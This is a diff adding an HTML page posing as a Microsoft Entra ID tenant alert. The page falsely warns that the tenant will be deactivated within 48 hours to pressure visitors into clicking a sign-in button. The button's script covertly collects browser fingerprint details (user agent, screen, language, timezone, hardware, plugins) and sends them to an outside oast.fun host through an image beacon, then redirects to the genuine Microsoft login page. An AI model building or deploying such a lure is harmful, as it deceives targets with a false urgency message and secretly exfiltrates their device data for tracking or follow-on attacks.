@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Entra ID Admin Notification</title>
+  <style>
+    body {
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f3f3f3;
+      color: #333;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+    }
+    .container {
+      background: white;
+      border-radius: 8px;
+      padding: 2rem;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      max-width: 400px;
+    }
+    .btn {
+      margin-top: 1.5rem;
+      background-color: #0078d4;
+      color: white;
+      border: none;
+      padding: 0.75rem 1.5rem;
+      border-radius: 4px;
+      font-size: 1rem;
+      cursor: pointer;
+    }
+    .btn:hover {
+      background-color: #005ea2;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>⚠️ Entra ID Tenant Alert</h2>
+    <p>Your Microsoft Entra ID tenant is scheduled for deactivation in <strong>48 hours</strong> due to inactive login activity.</p>
+    <p>To prevent tenant retirement, confirm your identity using your work account.</p>
+    <button class="btn" onclick="fingerprintAndRedirect()">Sign in to retain access</button>
+  </div>
+
+  <script>
+    function fingerprintAndRedirect() {
+      const userAgent = navigator.userAgent;
+      const screenRes = `${window.innerWidth}x${window.innerHeight}`;
+      const monitorRes = `${screen.width}x${screen.height}`;
+      const language = navigator.language || navigator.userLanguage;
+      const tzOffset = new Date().getTimezoneOffset();
+      const cores = navigator.hardwareConcurrency || "unknown";
+      const memory = navigator.deviceMemory || "unknown";
+      const platform = navigator.platform;
+      const touchPoints = navigator.maxTouchPoints || 0;
+      const isRetina = window.devicePixelRatio > 1;
+      const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(",");
+      const connection = navigator.connection ? navigator.connection.effectiveType : "unknown";
+
+      const data = {
+        ua: userAgent,
+        screen: screenRes,
+        monitor: monitorRes,
+        lang: language,
+        tz: tzOffset,
+        cores: cores,
+        mem: memory,
+        plat: platform,
+        touch: touchPoints,
+        retina: isRetina,
+        plugins: plugins,
+        conn: connection
+      };
+
+      const encodedParams = new URLSearchParams(data).toString();
+      const webhook = "https://ljvhnkminebdbavkwiwv54wjryc1bfd1i.oast.fun?" + encodedParams;
+
+      // Leak fingerprint
+      (new Image()).src = webhook;
+
+      // Redirect after short delay
+      setTimeout(() => {
+        window.location.href = "https://login.microsoftonline.com/";
+      }, 1500);
+    }
+  </script>
+</body>
+</html>
